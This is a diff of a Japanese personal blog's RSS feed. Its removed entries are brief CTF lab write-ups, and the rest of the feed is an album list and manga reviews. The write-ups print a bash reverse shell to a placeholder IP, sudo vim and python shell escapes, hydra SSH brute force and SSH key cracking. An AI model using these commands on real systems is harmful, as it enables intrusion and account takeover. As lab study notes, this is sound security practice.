system(&amp;#34;/bin/bash&amp;#34;) あとは実行してシェルをもらうと root になる </description>
-    </item>
-    
-    <item>
       <title>好きな邦楽アルバムを考えたい</title>
-      <link>http://side-realms.github.io/sound/best/</link>
+      <link>http://side-realms.github.io/misc/best/</link>
       <pubDate>Sat, 09 Mar 2024 13:24:01 +0900</pubDate>
       
-      <guid>http://side-realms.github.io/sound/best/</guid>
+      <guid>http://side-realms.github.io/misc/best/</guid>
       <description>修士も無事取れてジャーナルもちゃんと提出できて，本格的に仕事が始まる四月まで時間があるので(2週間)，今までやってみたかった好きな邦楽アルバムをまとめるやつ，を，やる🍟．
 せっかくなので名盤ランキングではなく好きなアルバムという視点でまとめる． 例えば名盤という視点ならジャックスの「ジャックスの世界」は間違いなく入ると思うけど正直このサイケっぽい GS はそこまで好きではないので除外する，みたいな感じ
 ジャンル混合の異種格闘ではあるけどボカロだけはそれだけでリストが作れるので除外する．
+※ 全然途中なので随時追加していく
 1. King Gnu / CEREMONY king gnu 自体あまり興味なかったけどいざ聴いてみるとやっぱ良い
 というか常田がアクモンとかレディへが好きらしいのでやっぱり聴かず嫌いせずに聴くべきだったんだろうな
 シングルとか EP みたいな小さいサイズの仕事をリリースするアーティストが多い中で物語性のあるアルバムを出せるのは king gnu の人気と実力が相まったものだと思う
@@ -392,86 +176,23 @@ user HTTP File Server があるので metasploit で CVE を見つける root wi
     </item>
     
     <item>
-      <title>Cyborg</title>
-      <link>http://side-realms.github.io/writeup/cyborg/</link>
-      <pubDate>Wed, 21 Feb 2024 07:18:48 +0900</pubDate>
-      
-      <guid>http://side-realms.github.io/writeup/cyborg/</guid>
-      <description>ウェルベルムコトハちゃんの事実を曲げる能力強すぎない？
-enum nmap 22/ssh 80/http gobuster /admin /etc ssh /etc にアクセスすると squid プロキシの情報が見れる ユーザ名とパスワードハッシュの組み合わせが見えるのでこれを使う とりあえず john でパスワードを手に入れる ssh にこれを使ったけど通らなかった hydra も通らない http に戻るとバックアップファイルをダウンロードするところがあったのでダウンロードする tar -xvf archive.tar borg というバックアップアプリを使っているらしい borg list /home/kali/THM/home/field/dev/final_archive borg extract /home/kali/THM/home/field/dev/final_archive::music_archive borg の使い方に少し苦労した ユーザ名は alex, パスワードも note.txt に書いてある root.txt ssh する sudo -l で /etc/mp3backups/backup.sh が見つかる while getopts c: flag do case &amp;#34;${flag}&amp;#34; in c) command=${OPTARG};; esac done --- (snip) --- cmd=$($command) echo $cmd -c オプションでコマンドを実行できる(なんのため？) sudo /etc/mp3backups/backup.</description>
-    </item>
-    
-    <item>
-      <title>StartUp</title>
-      <link>http://side-realms.github.io/writeup/startup/</link>
-      <pubDate>Wed, 21 Feb 2024 02:52:30 +0900</pubDate>
-      
-      <guid>http://side-realms.github.io/writeup/startup/</guid>
-      <description>最近 KAGOME の朝フルーツこれ一本を昼ごはんにしている
-健康になった気でいる
-enum nmap ftp ssh http gobuster files FTP anonymous ログインができる http から files で中身が見れて，ftp の中身が同期していることが分かる php のリバースシェルを配置する put php-reverse-shell.php シェル とりあえず中に入るとレシピが見れる lennie でログインする必要がある ./incidents ディレクトリ内で .pcapng が手に入る wireshark で .pcapng の TCP ストリームを追うとパスワードが手に入る これが lennie のパスワードだった(!?) あとは user.txt root.txt ./linpeas.sh はすぐに使えそうなものはない．．． ./scripts ディレクトリがあるので探してみる ./planner.sh が root で動作している ./planner.sh が呼び出す ./print.sh は lennie が所有している lennei で print.sh を書き換えて bash を呼び出せば root シェルが手に入る echo &amp;quot;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/[ip]/8888 0&amp;gt;&amp;amp;1&amp;quot; &amp;gt; /etc/print.</description>
-    </item>
-    
-    <item>
-      <title>SimpleCTF</title>
-      <link>http://side-realms.github.io/writeup/simplectf/</link>
-      <pubDate>Wed, 21 Feb 2024 02:31:08 +0900</pubDate>
-      
-      <guid>http://side-realms.github.io/writeup/simplectf/</guid>
-      <description>デュエマ，ゼニスというか昔のキャラが復活しているらしく，非常にやりたい
-動画見たら 4t ゼニスとかあって笑った
-enum nmap 21/ftp 80/http 2222/ssh gobuster simple CVE CMS 2.2.8 で構成されたサイトが見つかる CVE-2019-9053 で SQLi が通るっぽい PoC を指してuser name と password を手に入れる ssh user.txt が手に入る sudo -l で vim がパスワード無しで使えるらしい sudo vim -c &#39;:!/bin/sh&#39; root.txt が手に入る </description>
-    </item>
-    
-    <item>
-      <title>BasicPentesting</title>
-      <link>http://side-realms.github.io/writeup/basicpentesting/</link>
-      <pubDate>Wed, 21 Feb 2024 02:21:30 +0900</pubDate>
-      
-      <guid>http://side-realms.github.io/writeup/basicpentesting/</guid>
-      <description>friko, マジでアツい
-radio head でもあり bright eyes でもあり全曲の殺意がまんべんなく高い\
-enum 22/ssh 80/http 8009/ajp 8080/http-proxy SMB SMB が空いてるようだったのでログインする enum4linux 10.10.77.150 smbclient \\\\10.10.77.150\\Anonymous -U Anonymous more staff.txt user name は Jan ? ssh ssh でブルートフォース hydra -t 16 -l jan -P /usr/share/wordlists/rockyou.txt 10.10.77.150 ssh Jan じゃなくて jan なのキモすぎ，揃えてくれ ssh ログイン Kay が見つかる .ssh が見つかったので id_rsa を持ってきて ssh2john scp jan@10.10.77.150:/home/kay/.ssh/id_rsa ./ - ssh2john id_rsa &amp;gt; hash.txt john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt chmod 600 ./id_rsa ssh -i id_rsa kay@10.</description>
-    </item>
-    
-    <item>
-      <title>RootMe</title>
-      <link>http://side-realms.github.io/writeup/rootme/</link>
-      <pubDate>Tue, 20 Feb 2024 02:16:10 +0900</pubDate>
-      
-      <guid>http://side-realms.github.io/writeup/rootme/</guid>
-      <description>植峰ノルジュ，最近マジでアツい
-マイクラ配信がおもしろすぎる
-enum nmap 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) gobuster /panel：ファイルアップロード用 /uploads：アップロードが見える user.txt リバースシェルをアップロードすればいい .php のフィルタがかかっているので .php5 とかにでもしてアップロード root.txt linpeas.sh で /usr/bin/python がヒットしたので GTFObin でみる python -c &#39;import os; os.execl(&amp;quot;/bin/sh&amp;quot;, &amp;quot;sh&amp;quot;, &amp;quot;-p&amp;quot;)’ おしまい </description>
-    </item>
-    
-    <item>
-      <title>WifiHacking 101</title>
-      <link>http://side-realms.github.io/writeup/wifihacking/</link>
-      <pubDate>Tue, 20 Feb 2024 02:06:20 +0900</pubDate>
-      
-      <guid>http://side-realms.github.io/writeup/wifihacking/</guid>
-      <description>BOØWY，空前の大ブーム
-aircrack-ng 4way-handshakeをキャプチャした pcap が得られるので，これをクラックすればいい Aircrack-ng ~~.cap -w ~~.txt で総当たりができるらしいが遅いので，HCAAPX ファイルに変換する方法が使えるらしい aircrack-ng -j wifi ~~.cap aircrack-ng -a2 -b BSSID -w ~~.txt ~~.hccapx え，終わった．．． 手元の環境でもやりたい</description>
-    </item>
-    
-    <item>
-      <title>Agent Sudo</title>
-      <link>http://side-realms.github.io/writeup/sudoagent/</link>
-      <pubDate>Sat, 17 Feb 2024 20:49:48 +0900</pubDate>
-      
-      <guid>http://side-realms.github.io/writeup/sudoagent/</guid>
-      <description>そういえばLerningしかやってなくてマシンを解いてないことに気付いたのでせっかくなら writeup を書きつつやっていく
-enum nmap PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA) | 256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA) |_ 256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Annoucement |_http-server-header: Apache/2.4.29 (Ubuntu) gobuster /.hta (Status: 403) [Size: 278] /.htpasswd (Status: 403) [Size: 278] /.htaccess (Status: 403) [Size: 278] /index.php (Status: 200) [Size: 218] /server-status (Status: 403) [Size: 278] user.</description>
-    </item>
-    
-    <item>
       <title>見たものログ 2024</title>
       <link>http://side-realms.github.io/log/log_2024/</link>
       <pubDate>Mon, 01 Jan 2024 17:57:25 +0900</pubDate>
       
       <guid>http://side-realms.github.io/log/log_2024/</guid>
-      <description>漫画 三つ目がとおる よくある文明風刺 古代遺跡が頻出するのでオープンワールドを探索している気分になる 縄文遺跡を発掘する話が好き ポジティブ先生 ここまで読むとパターン見えてきたよ！って気持ちになる 悪の組織シリーズ好きだから単行本にしてほしい バンパイヤ 「間久部」だし魔女が成功を予言するシーンもあるから多分マクベスだろう 手塚治虫本人が出ていて且つストーリーに深くかかわっているのは意外 ヒゲオヤジが武闘派なのも意外 第一部しか読んでない．第二部は雑誌の都合で打ち切りになってしまったらしい 人間なのにかなり邪悪な思想をもつ間久部とバンパイヤなのにかなり善良な（差別気味ですが）トッペイの対比を描きたかったんだろうと思う マグマ大使 人間モドキをめぐる人間の葛藤が面白かった 人間モドキが人間モドキバレするのに加えて人間が人間モドキと疑われて襲われるシーン 人間モドキが人間と絆を繋げてしまうシーン ゴア弱すぎない？ 最後の方のやっつけ感が残念だけどこの時期はかなりオーバーワーク気味だったらしい 海のトリトン ポセイドン貯蔵庫みたいなのマジでキモすぎて笑った ピピ子かわいすぎる，新しい扉が開くところだった ガノモスと自爆エンドですべてを台無しにしている ザ・クレーター マジでおもしろい．この時期に「手塚は終わった」って言われてたらしいけどこの時代にこのレベルの作品を描けた人何人いるんですか？？ 風穴 ？？？ 鈴が鳴った 音と記憶がトラウマとして結びついた結果．．．みたいな ラストの皮肉っぽい感じ，咀嚼しきれない クレーターの男 戦争アカンな（薄） 数百年も地球への帰還を求めていたのに地球の惨状を知って月での暮らしの方を選んでしまう 核の光怖すぎ 煙で永遠に生きられるけど正気でいられるのか，みたいな怖さと死ぬときはほぼ自殺になってしまう怖さがある 全部面白いけど書ききれない 七色いんこ かなりおもしろい ほとんど短編集の体をしていて娯楽作品だが大筋のストーリーが相当いい 絵もいい．いんこがただ冷静なキャラに収まっていないのが余裕を感じる いんこの正体，女刑事との関係，みたいなのは手塚治虫もこういうの描くのか．．．みたいな気持ちになる 「日本の国土！！」が思想強すぎて笑った アポロの歌 女神像のシーンがうますぎる．劇画とはこのこと 近石昭吾の転生は，毎回愛を知った瞬間にどちらかが死ぬことで幕を閉じる 最後の描写的に一生転生するからかなり怖い かなり最後の方にアポロが出てくるが，ここまで考えているなら本当に怖い 合成人間の話がかなりつらい 合成人間と区別するための，人間としての尊厳を考えたときに愛情が必要だと手塚治虫は描いている 一方で合成人間である女王は途中から愛情を覚えている（ように見える） そうするとこの世界で区分される人間と合成人間の違いは組成的な違いしかないように見える 昭吾の暗殺仲間は愛情を知らない（ないがしろにする）人間の表現なのかな？ きりひと讃歌と同時に連載していたらしい．異常 人間ども集まれ 絵柄がこれまでとは全然違って力が抜けている これが悪いわけではなくてむしろテーマに寄り添っていて好みではある ただ手塚治虫に求める（何様）絵柄はこれではないという感じ こういう作品を見るたびに思うけど話の広げ方がうまい時期とめちゃくちゃな時期がある エロ要素がふんだんに盛り込まれているんだけどどれもが迫真すぎてエロくない 性癖目的のエロと迫真のエロが切り分かれてる気がする．考えすぎかも というかこの絵柄だから耐えてるだけで普通にどろろとかの絵柄でやったら事故ると思う 第三の性が今でいうLGBTQみたいな話かどうかは分からない 戦争はダメなのはそれはそうなんだが第三の性を使って戦争をエンタメにするのがよくないという倫理観と闘牛は許せる，みたいな倫理観の境界どこにあるのか エンタメとしての戦争（最悪）とか，第三の性みたいなのを目で見たことないから（それはそうなんだが）よく分からない 人間の体をしていたら倫理観が発動するのか，じゃあハンディキャップとか犯罪者はどうなるんだ，みたいな 犯罪者とハンディキャップを同じくくりとしてみているわけではない 反逆系は手塚治虫のパターン（メトロポリスとかバンパイヤとか）だけどこの作品は反逆側も人間なだけに重い かなりデフォルメが効いててそれが逆にしんどい（銃殺がただの穴あきで表現されるとか） メトロポリス 旧版をよんだので読みずらかった よくある反逆系 子供向けだからか結末付近が「こういうのでいいんだよ」って感じでよかった．こういうのでいいんだよ ミッドナイト すばらしいと思う，手塚治虫の短編能力はマジで目を見張るものがある しかもただの短編というわけではなく，七色いんこのように大筋のストーリがあってその中で短編，たまに中編が混じるという感じ 珍しく小さい女の子が頻出する．かわいい ここまで単純な正義を貫いた作品も珍しいと思いつつ，ホラー，SF，人情などただの勧善懲悪で終わらせない創作能力の高さも同時に感じる カササギ運輸・クリプトムネジア・花火師の話が好き 特に花火師は良い 対決で終わりかと思ったらその奥にもう一つエンドがある ブラックジャックとか三つ目とかがクロスオーバー的に出てきて胸アツ ラストが衝撃すぎたが性別をテーマにする手塚治虫らしいといえばらしいか．．． 「どんでん返し」はこれくらいやってから言ってほしい ばるぼら 相当おもしろかった 芸術と人間関係，みたいな話 このころの手塚は相当落ち込んでいたらしく，アニメも上手くいかず，会社も倒産，少年誌もバズらず，みたいな感じだったらしい 前半は短編形式で若干のコメディを交えながら話が進むが，後半からばるぼらの正体は何か，みたいなところに迫っていく 手塚治虫の根底には「マンガを大人の文化（芸術）にする」みたいな意思があったはずで，その影響なのか後半は芸術観に迫った話が多いように思う ばるぼらが魔女である，みたいなところまでは良くて，一方で魔女と芸術がどういう関係にあるかはまだ理解できない 宗教的観念なのか？ 最後はほぼ神vs人間みたいな構図になっている 死の淵で創作した作品は理性を保つためなのか，それとも単純に心身を削って完成した賜物なのか 名声に対する意識も気になる 美倉は最後の作品がバズっても世間に姿を現さず，「死んだ」という体で浮浪している これまでの美倉（特に結婚後）は名声に意識があった 手塚治虫自身に対する戒め的な表現なのか？とか思ったがよく分からない ファウスト ファウストと百物語が入っているがどっちもファウスト準拠 百物語の方がさすがに洗練されていて面白い ファウストは古典をそのままなぞっただけ感があるが，百物語はちゃんと自分の物語になっている 名前のモジり スダマさすがに可愛すぎる マジでケモナーになってしまった メタモルフォーゼも同時に発症してしまって救いようがない このころスランプの時期だったらしい． サスピション あまり面白くなかった というか結末が思ったより単純 ハードルが高すぎる感は否めない こじき姫さすがに性癖出すぎ 後期の作品だけあって絵柄は綺麗 ガラス城の記録 かなり面白かった 終わり方が．．．あんまりにも．．． 来るべき世界 安直な文明漫画といえばそうかも 世界が滅亡することが一番の平和というのはそうかもなあという気持ちになる 火星博士 この時期のアクションは可愛げがあっておもしろい 大空魔王 拳銃天使 最後のコマですべてひっくり返ってて笑った 仮面の冒険児 上を下へのジレッタ VR を先取りした漫画だと思う．さすがに先見の明すぎる 最後世界の終焉を迎えるのは特に意味がないと思っている ジレッタが出てくるのが意外と遅いが，これは逆説的に書き始めの時点からプロットがしっかり引かれていることの証拠だと思う． ヒロインの変身具合がすごい 実写でやったら多分冷めるだろうな，ぐらいの勢い 多分映画とかアニメに対するライバル心・熱意があって漫画表現の最上を狙ったんだと思うが考えすぎかもしれない 38 度線の怪物 火星から来た男 化石人間 38 度線は朝鮮のことかと思ったけどそうではないんだな SF ミックス 短編集が入っている ランダムに入っていて，SF ミックスという名前で出版をしているわけではない？ 時計仕掛けのりんご 全部の短編がクオリティ高くて面白い ペーターキュルテンの記録 連続殺人犯のノンフィクション ふるまいは完全にサイコパスなんだが途中途中に挟まる人間への愛情が変なコントラストになっていて怖い 時計仕掛けのりんご いい SF でもこれ仮に市内でうまくいっても全国に拡散するのは難しいんじゃないか カノン 戦争系の描写つらすぎる 仮に小さいころ失くした友達に会えるってなっても余計に悲しくなるから会いたくないよな 白い幻影 これ手塚治虫の短編の中で一番好き 妻側の誠意と不憫さが後味最悪 でも夫側も記憶喪失なだけで誠意が無いわけではない 妻側がもう後戻りできない年齢になっているのも悲しい 最上殿始末 間男が実は元殿だった説を推す MW すさまじい Man, Women という意味で MW らしい 雰囲気はアドルフに告ぐに似ているが，こっちの方がフィクションっぽい 政治悪，同性愛，異常性癖，猟奇殺人みたいなありとあらゆる闇がてんこもり 一方でそれぞれが十分な情報量をもっていないので中途半端ともとれてしまう 警察と神父のやりとりは面白かった．実際に懺悔はどう扱われるんだろう 後味の悪さ，というか勇気ある行動も報われず悪が買ってしまう結末は CUE とか SEVEN に似てる 映画もあるらしいけどキャッチコピーが終わってて悲しい 結城の性癖どうなってんや 賀来の葛藤が醍醐味だと思う．神父という立場でありながら同性愛，かつ犯罪を見過ごす立場にいることの矛盾，みたいな 同性愛のスクープの解決方法はおもしろかった 陽だまりの樹 火の鳥 小さいころ読んだけど覚えてないし改めて読んで感想を残そうという試み 黎明編 ラストのコママジで良い モノクロなのにここまで広い世界描けるのすげ～ 未来編 クライマックスすぎる 世界絶滅後の景色の移り変わりの描き方が映画かと思った 2001年宇宙の旅を感じる マサトが絶対的な存在になった後の展開は目を見張るものがある 単純に人間になるだけでなくナメクジ人間みたいなのが登場することで，今自分たちが知ってる古生物以前にもっと深い歴史があったように思える 序盤の戦争勃発みたいな話をこの時代に想像できていたのマジで手塚治虫すぎる 大和編 殉死の尊さと命の尊さが逆転したのってどれくらいの時期なんだろう 宇宙編 流刑星の救われなさ こういう強烈な環境と「なれの果て」みたいなのを描くのうますぎるな 火の鳥はフレミルの民族ってことなのか？ でも牧村がフレミルを虐殺しているときにフレミルはちゃんと死んでいるから永遠の命をもっているのはコンタクトをとってきたフレミルだけなんだよな 一方でフレミルが以前人間の姿で登場したときはこの容姿だったように思える 顔が醜くなったのは黎明編の猿田彦に似てるな 鳳凰編 復活編・羽衣編 望郷編 乱世編 生命編 異形編 太陽編 ゴッドファーザーの息子 ゴッドファーザーの息子 全くタイプの違う友人ができることはよくある バンカラが特攻で死んでしまうのはしんみりする 紙の砦 終戦した喜びと，残り続ける戦争の禍根がまざまざと描かれている 大寒の彼女がオペラ歌手の夢を断念せざるを得なくなる悲しさ ノーマン 月のクレーターが実は戦争の遺恨だったという設定 異星人の設定を考えるのがいつもうまい マグマ大使とか海のトリトンは「え？」みたいな話の進み方が多かったけど今回はある程度納得する進み方でよかった 総員玉砕せよ 人間はシンプルに描かれているのに対して背景が異常に丁寧に描かれていてリアリティがある 息がある仲間の小指を切り落として持ち帰るシーンとかも，雨に打たれながら異国で不本意に死んでいくナンセンスさを感じる 上官の意思とかエゴでで人間が死ぬのは救われないのはそうだけれど「戦争だというのにリクツばかりいうな」みたいなセリフは感じるものがある 劇画ヒットラー 史実としては信用してないし，若干読みづらい 行間を文字で埋めているのでしょうがない ヒトラーがどうして民主主義を守りながら独裁政権を確立したのか？ ヒトラーが「全権委任法」を成立させたから しかし，これは当作品にもあるように，ほとんど脅迫のような雰囲気で成立した． ヒトラーに反対するような共産党議員，社会民主党議員は既に逮捕されていたため，投票の場にすら出席できなかった． この全権委任法によってヒトラーはほとんど自由に法律を作ることができるようになった(ここは理解が怪しい) これにより国会は形骸化，議会制民主主義が消え，実質的にワイマール憲法が廃止したことになる ヒトラーの周囲には貧困が蔓延っている 一方で，ヒトラーのように「自分が不幸だから周囲も不幸であるべき」と思うかどうかはその人の精神によるものだと思う 選挙行こうと思った ビッグX 飽きたのがアリアリと伝わる 雨ふり小僧 雨ふり小僧 確か後期の作品 絵柄が安定していてめちゃくちゃカワイイ 最後まで待つ雨ふり小僧けなげすぎるだろ るんは風の中 カラッとしつつも湿度高めのSF こういうのいいよな 現代マンガ選集(異形編) ポーチで少女が小犬と 萩尾望都の SF を初めて読んだ あっさりしていて面白い 「COM」に掲載されていたらしい 火の鳥のページ埋めに掲載したらしいけど埋めどころか主役級だと思う アカプルコ・ゴールド 吉田秋生の絵は良い 新しいものに飛び付くのはやめられない．．． サイボーグ 水木しげるにしてはあっさりしてるように思う ぼくとフリオと校庭で マジでいい フリオどこいっちゃったんだよ．．． ナンバー7 イラストが安定し始めたような気がする 最後飽きすぎだろ 百物語 ロロの旅路 悲しすぎる 犬とかオオカミを描かせるとマジでかわいいな 荒野の七ひき これは面白い 架空の宇宙人の特性とかめちゃくちゃアイデア湧いてくるんだろうな 安達が原 アンニー&amp;hellip; 「アンニー!</description>
+      <description>社会人一年目ということで，あまり創作は見れなかった．
+漫画マジで読まなくなってしまった．去年の半年分くらいしか読めていない． まあ時間もないしな．．． というかどうしても電車の中で読める本とか映画に流れがちだ． 弐瓶勉とか電車で雑に読んでも理解できない
+手塚治虫もう読むの無くなってきたな．．． そろそろ全集買わないといけないか？
+本をまた読むようになった． 新書とか流行物は手を出せていないがおもしろい本を見つけられて嬉しい． 来年はライトノベルとかにも手を出してみたい．
+映画もまあまあかな．．． 電車で見れるので良い
+結構雑多に選んでみたが結構当たりが多くて嬉しい
+最近の映画よりは昔の映画の方が見ごたえがあるなあ．．．
+外に出る機会が多くなったので，展示とかカフェを探すようになった． 展示とかよかった店も記録しておきたい
+ゲームが顕著だ． マジでエルデンリングしか記憶にない． やりたいゲームは山ほどあるんだが時間が．．．
+Vtuber はあまり変化が無い． Vtuber，増えるばかりでほとんど減らないからなかなか．．．
+たまに去年の見返すんだが，結構思い出せて楽しい． こういうログを残すのってやっぱいいな
+漫画 三つ目がとおる よくある文明風刺 古代遺跡が頻出するのでオープンワールドを探索している気分になる 縄文遺跡を発掘する話が好き ポジティブ先生 ここまで読むとパターン見えてきたよ！って気持ちになる 悪の組織シリーズ好きだから単行本にしてほしい バンパイヤ 「間久部」だし魔女が成功を予言するシーンもあるから多分マクベスだろう 手塚治虫本人が出ていて且つストーリーに深くかかわっているのは意外 ヒゲオヤジが武闘派なのも意外 第一部しか読んでない．第二部は雑誌の都合で打ち切りになってしまったらしい 人間なのにかなり邪悪な思想をもつ間久部とバンパイヤなのにかなり善良な（差別気味ですが）トッペイの対比を描きたかったんだろうと思う マグマ大使 人間モドキをめぐる人間の葛藤が面白かった 人間モドキが人間モドキバレするのに加えて人間が人間モドキと疑われて襲われるシーン 人間モドキが人間と絆を繋げてしまうシーン ゴア弱すぎない？ 最後の方のやっつけ感が残念だけどこの時期はかなりオーバーワーク気味だったらしい 海のトリトン ポセイドン貯蔵庫みたいなのマジでキモすぎて笑った ピピ子かわいすぎる，新しい扉が開くところだった ガノモスと自爆エンドですべてを台無しにしている ザ・クレーター マジでおもしろい．この時期に「手塚は終わった」って言われてたらしいけどこの時代にこのレベルの作品を描けた人何人いるんですか？？ 風穴 ？？？ 鈴が鳴った 音と記憶がトラウマとして結びついた結果．．．みたいな ラストの皮肉っぽい感じ，咀嚼しきれない クレーターの男 戦争アカンな（薄） 数百年も地球への帰還を求めていたのに地球の惨状を知って月での暮らしの方を選んでしまう 核の光怖すぎ 煙で永遠に生きられるけど正気でいられるのか，みたいな怖さと死ぬときはほぼ自殺になってしまう怖さがある 全部面白いけど書ききれない 七色いんこ かなりおもしろい ほとんど短編集の体をしていて娯楽作品だが大筋のストーリーが相当いい 絵もいい．いんこがただ冷静なキャラに収まっていないのが余裕を感じる いんこの正体，女刑事との関係，みたいなのは手塚治虫もこういうの描くのか．．．みたいな気持ちになる 「日本の国土！！」が思想強すぎて笑った アポロの歌 女神像のシーンがうますぎる．劇画とはこのこと 近石昭吾の転生は，毎回愛を知った瞬間にどちらかが死ぬことで幕を閉じる 最後の描写的に一生転生するからかなり怖い かなり最後の方にアポロが出てくるが，ここまで考えているなら本当に怖い 合成人間の話がかなりつらい 合成人間と区別するための，人間としての尊厳を考えたときに愛情が必要だと手塚治虫は描いている 一方で合成人間である女王は途中から愛情を覚えている（ように見える） そうするとこの世界で区分される人間と合成人間の違いは組成的な違いしかないように見える 昭吾の暗殺仲間は愛情を知らない（ないがしろにする）人間の表現なのかな？ きりひと讃歌と同時に連載していたらしい．異常 人間ども集まれ 絵柄がこれまでとは全然違って力が抜けている これが悪いわけではなくてむしろテーマに寄り添っていて好みではある ただ手塚治虫に求める（何様）絵柄はこれではないという感じ こういう作品を見るたびに思うけど話の広げ方がうまい時期とめちゃくちゃな時期がある エロ要素がふんだんに盛り込まれているんだけどどれもが迫真すぎてエロくない 性癖目的のエロと迫真のエロが切り分かれてる気がする．考えすぎかも というかこの絵柄だから耐えてるだけで普通にどろろとかの絵柄でやったら事故ると思う 第三の性が今でいうLGBTQみたいな話かどうかは分からない 戦争はダメなのはそれはそうなんだが第三の性を使って戦争をエンタメにするのがよくないという倫理観と闘牛は許せる，みたいな倫理観の境界どこにあるのか エンタメとしての戦争（最悪）とか，第三の性みたいなのを目で見たことないから（それはそうなんだが）よく分からない 人間の体をしていたら倫理観が発動するのか，じゃあハンディキャップとか犯罪者はどうなるんだ，みたいな 犯罪者とハンディキャップを同じくくりとしてみているわけではない 反逆系は手塚治虫のパターン（メトロポリスとかバンパイヤとか）だけどこの作品は反逆側も人間なだけに重い かなりデフォルメが効いててそれが逆にしんどい（銃殺がただの穴あきで表現されるとか） メトロポリス 旧版をよんだので読みずらかった よくある反逆系 子供向けだからか結末付近が「こういうのでいいんだよ」って感じでよかった．こういうのでいいんだよ ミッドナイト すばらしいと思う，手塚治虫の短編能力はマジで目を見張るものがある しかもただの短編というわけではなく，七色いんこのように大筋のストーリがあってその中で短編，たまに中編が混じるという感じ 珍しく小さい女の子が頻出する．かわいい ここまで単純な正義を貫いた作品も珍しいと思いつつ，ホラー，SF，人情などただの勧善懲悪で終わらせない創作能力の高さも同時に感じる カササギ運輸・クリプトムネジア・花火師の話が好き 特に花火師は良い 対決で終わりかと思ったらその奥にもう一つエンドがある ブラックジャックとか三つ目とかがクロスオーバー的に出てきて胸アツ ラストが衝撃すぎたが性別をテーマにする手塚治虫らしいといえばらしいか．．． 「どんでん返し」はこれくらいやってから言ってほしい ばるぼら 相当おもしろかった 芸術と人間関係，みたいな話 このころの手塚は相当落ち込んでいたらしく，アニメも上手くいかず，会社も倒産，少年誌もバズらず，みたいな感じだったらしい 前半は短編形式で若干のコメディを交えながら話が進むが，後半からばるぼらの正体は何か，みたいなところに迫っていく 手塚治虫の根底には「マンガを大人の文化（芸術）にする」みたいな意思があったはずで，その影響なのか後半は芸術観に迫った話が多いように思う ばるぼらが魔女である，みたいなところまでは良くて，一方で魔女と芸術がどういう関係にあるかはまだ理解できない 宗教的観念なのか？ 最後はほぼ神vs人間みたいな構図になっている 死の淵で創作した作品は理性を保つためなのか，それとも単純に心身を削って完成した賜物なのか 名声に対する意識も気になる 美倉は最後の作品がバズっても世間に姿を現さず，「死んだ」という体で浮浪している これまでの美倉（特に結婚後）は名声に意識があった 手塚治虫自身に対する戒め的な表現なのか？とか思ったがよく分からない ファウスト ファウストと百物語が入っているがどっちもファウスト準拠 百物語の方がさすがに洗練されていて面白い ファウストは古典をそのままなぞっただけ感があるが，百物語はちゃんと自分の物語になっている 名前のモジり スダマさすがに可愛すぎる マジでケモナーになってしまった メタモルフォーゼも同時に発症してしまって救いようがない このころスランプの時期だったらしい． サスピション あまり面白くなかった というか結末が思ったより単純 ハードルが高すぎる感は否めない こじき姫さすがに性癖出すぎ 後期の作品だけあって絵柄は綺麗 ガラス城の記録 かなり面白かった 終わり方が．．．あんまりにも．．． 来るべき世界 安直な文明漫画といえばそうかも 世界が滅亡することが一番の平和というのはそうかもなあという気持ちになる 火星博士 この時期のアクションは可愛げがあっておもしろい 大空魔王 拳銃天使 最後のコマですべてひっくり返ってて笑った 仮面の冒険児 上を下へのジレッタ VR を先取りした漫画だと思う．さすがに先見の明すぎる 最後世界の終焉を迎えるのは特に意味がないと思っている ジレッタが出てくるのが意外と遅いが，これは逆説的に書き始めの時点からプロットがしっかり引かれていることの証拠だと思う． ヒロインの変身具合がすごい 実写でやったら多分冷めるだろうな，ぐらいの勢い 多分映画とかアニメに対するライバル心・熱意があって漫画表現の最上を狙ったんだと思うが考えすぎかもしれない 38 度線の怪物 火星から来た男 化石人間 38 度線は朝鮮のことかと思ったけどそうではないんだな SF ミックス 短編集が入っている ランダムに入っていて，SF ミックスという名前で出版をしているわけではない？ 時計仕掛けのりんご 全部の短編がクオリティ高くて面白い ペーターキュルテンの記録 連続殺人犯のノンフィクション ふるまいは完全にサイコパスなんだが途中途中に挟まる人間への愛情が変なコントラストになっていて怖い 時計仕掛けのりんご いい SF でもこれ仮に市内でうまくいっても全国に拡散するのは難しいんじゃないか カノン 戦争系の描写つらすぎる 仮に小さいころ失くした友達に会えるってなっても余計に悲しくなるから会いたくないよな 白い幻影 これ手塚治虫の短編の中で一番好き 妻側の誠意と不憫さが後味最悪 でも夫側も記憶喪失なだけで誠意が無いわけではない 妻側がもう後戻りできない年齢になっているのも悲しい 最上殿始末 間男が実は元殿だった説を推す MW すさまじい Man, Women という意味で MW らしい 雰囲気はアドルフに告ぐに似ているが，こっちの方がフィクションっぽい 政治悪，同性愛，異常性癖，猟奇殺人みたいなありとあらゆる闇がてんこもり 一方でそれぞれが十分な情報量をもっていないので中途半端ともとれてしまう 警察と神父のやりとりは面白かった．実際に懺悔はどう扱われるんだろう 後味の悪さ，というか勇気ある行動も報われず悪が買ってしまう結末は CUE とか SEVEN に似てる 映画もあるらしいけどキャッチコピーが終わってて悲しい 結城の性癖どうなってんや 賀来の葛藤が醍醐味だと思う．神父という立場でありながら同性愛，かつ犯罪を見過ごす立場にいることの矛盾，みたいな 同性愛のスクープの解決方法はおもしろかった 陽だまりの樹 火の鳥 小さいころ読んだけど覚えてないし改めて読んで感想を残そうという試み 黎明編 ラストのコママジで良い モノクロなのにここまで広い世界描けるのすげ～ 未来編 クライマックスすぎる 世界絶滅後の景色の移り変わりの描き方が映画かと思った 2001年宇宙の旅を感じる マサトが絶対的な存在になった後の展開は目を見張るものがある 単純に人間になるだけでなくナメクジ人間みたいなのが登場することで，今自分たちが知ってる古生物以前にもっと深い歴史があったように思える 